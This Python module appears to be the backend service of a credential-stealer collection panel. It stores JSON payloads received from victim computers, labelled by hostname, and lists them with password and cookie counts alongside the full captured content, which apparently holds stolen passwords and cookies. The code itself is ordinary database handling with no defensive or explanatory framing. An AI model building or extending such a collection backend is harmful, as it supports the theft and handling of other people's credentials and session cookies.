import logging
import os
from datetime import UTC, datetime
from typing import Any

from app.db import SessionLocal
from app.models import Payload

logger = logging.getLogger(__name__)

ENVIRONMENT = os.getenv("ENVIRONMENT", "production")


def parse_payload_datetime(payload: dict[str, Any]) -> datetime:
    executed_at = payload.get("executedAt")
    if isinstance(executed_at, str):
        try:
            return datetime.fromisoformat(executed_at.replace("Z", "+00:00"))
        except ValueError:
            pass
    return datetime.now(UTC)


def save_payload_record(payload: dict[str, Any]) -> dict[str, Any]:
    pc_name = str(payload.get("hostname") or "unknown")
    recorded_at = parse_payload_datetime(payload)

    with SessionLocal() as session:
        row = Payload(
            environment=ENVIRONMENT,
            pc_name=pc_name,
            datetime=recorded_at,
            content=payload,
        )
        session.add(row)
        session.commit()
        session.refresh(row)

    logger.info(
        "Saved payload id=%s environment=%s pc_name=%s",
        row.id,
        row.environment,
        row.pc_name,
    )
    return {
        "id": row.id,
        "environment": row.environment,
        "pc_name": row.pc_name,
        "datetime": row.datetime.isoformat(),
    }


def verify_database_connection() -> None:
    with SessionLocal() as session:
        session.connection()


def list_payloads(
    environment: str | None = None,
    pc_name: str | None = None,
    page: int = 1,
    page_size: int = 20,
) -> tuple[list[dict[str, Any]], int]:
    page = max(page, 1)
    page_size = max(min(page_size, 100), 1)

    with SessionLocal() as session:
        query = session.query(Payload).order_by(Payload.datetime.desc())
        if environment:
            query = query.filter(Payload.environment == environment)
        if pc_name:
            query = query.filter(Payload.pc_name == pc_name)

        total = query.count()
        rows = query.offset((page - 1) * page_size).limit(page_size).all()
        items = [
            {
                "id": row.id,
                "environment": row.environment,
                "pc_name": row.pc_name,
                "datetime": row.datetime.isoformat(),
                "password_count": row.content.get("passwordCount"),
                "cookie_count": row.content.get("cookieCount"),
            }
            for row in rows
        ]
        return items, total


def get_payload_by_id(payload_id: int) -> dict[str, Any] | None:
    with SessionLocal() as session:
        row = session.get(Payload, payload_id)
        if row is None:
            return None
        return {
            "id": row.id,
            "environment": row.environment,
            "pc_name": row.pc_name,
            "datetime": row.datetime.isoformat(),
            "content": row.content,
        }


def list_distinct_environments() -> list[str]:
    with SessionLocal() as session:
        rows = session.query(Payload.environment).distinct().order_by(Payload.environment).all()
        return [row[0] for row in rows]


def list_distinct_pc_names(environment: str | None = None) -> list[str]:
    with SessionLocal() as session:
        query = session.query(Payload.pc_name).distinct()
        if environment:
            query = query.filter(Payload.environment == environment)
        rows = query.order_by(Payload.pc_name).all()
        return [row[0] for row in rows]
